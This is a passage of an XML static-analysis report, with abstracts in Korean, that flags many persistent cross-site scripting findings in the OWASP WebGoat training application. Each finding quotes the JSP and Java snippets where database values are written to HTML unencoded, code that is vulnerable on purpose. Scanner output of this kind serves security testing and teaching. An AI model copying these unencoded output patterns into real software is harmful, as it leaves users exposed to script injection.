<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0AE9FA15C07EA38D4F0B007C1CA58E9D" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 109 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>109</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.DISCIPLINARY_DATE%&gt;" type="text" value="&lt;%=employee.getDisciplinaryActionDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6EFA53009D46D5B7BD647DDB4FED1BAD" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getFirstName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E95F91016CD202AD9E2AC899AF9BAFDF" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="45D398558785E96900A4AA8FE04DEA0C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ListStaff.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C9CEF022972D409A16916E453BED7C28" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="561A5630E5AEDEF7200E25F6F61E72D2" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.ADDRESS2%&gt;" type="text" value="&lt;%=employee.getAddress2()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="39ABE5FF7BF0FC8A1DD462D8D0ECF826" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getFirstName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C6A666FC90242705B57829FF6DC411F7" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>StoredXss.java의 makeCurrent() 메서드가 228 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>StoredXss.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/StoredXss.java</FilePath>
<LineStart>228</LineStart>
<Snippet>	    if ((results != null) &amp;&amp; results.first())
	    {
		ec.addElement(new H1("Message Contents For: "
			+ results.getString(TITLE_COL)));
		Table t = new Table(0).setCellSpacing(0).setCellPadding(0)</Snippet>
<TargetFunction>org.apache.ecs.html.H1.H1()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>StoredXss.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/StoredXss.java</FilePath>
<LineStart>224</LineStart>
<Snippet>	    statement.setString(1, getNameroot(s.getUserName()) + "%");
	    statement.setInt(2, messageNum);
	    ResultSet results = statement.executeQuery();

	    if ((results != null) &amp;&amp; results.first())</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7C10155B2FF2567FAD8408419D63CCA1" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.DESCRIPTION%&gt;" type="text" value="&lt;%=employee.getPersonalDescription()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9CC822FE0BA5504C08BED0BA8139063C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 91 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>91</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getDisciplinaryActionDate()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9EE9E30A2284200B1B793EA1328F92CD" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 93 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>93</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionNotes()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EF21C621ECBDE7BD82E3749C93838E71" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="ADBCD9E7B435AF3EB333A6C8AA97A3E6" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 99 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>99</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionNotes()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6E633A4DABAF25FE5D8E5DBA41E63B0E" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 21 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>21</LineStart>
<Snippet>						Last Name:					&lt;/TD&gt;
					&lt;TD width="196"&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
				  &lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="370DA26BE572E1A05549498C523C5767" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 33 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>33</LineStart>
<Snippet>						&lt;!-- STAGE 4 - FIX  Note that the description value below gets encoded and address1 here is not --&gt;

						&lt;%=employee.getAddress1()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D4AF4816B68136CAF2C6922447D3FE6A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 38 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>38</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;%=employee.getAddress2()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1E6C730358881CDCF3E41ED19062867A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 123 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>123</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=CrossSiteScripting.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=CrossSiteScripting.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=CrossSiteScripting.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6909884E4FFCB403DE46FFD2AFE8E23C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FFB053A78F91258999CB09357A96333F" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.ADDRESS1%&gt;" type="text" value="&lt;%=employee.getAddress1()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AAFC1F7059CAAA46A9CD6BDBA80E9308" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>CSRF.java의 makeCurrent() 메서드가 253 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
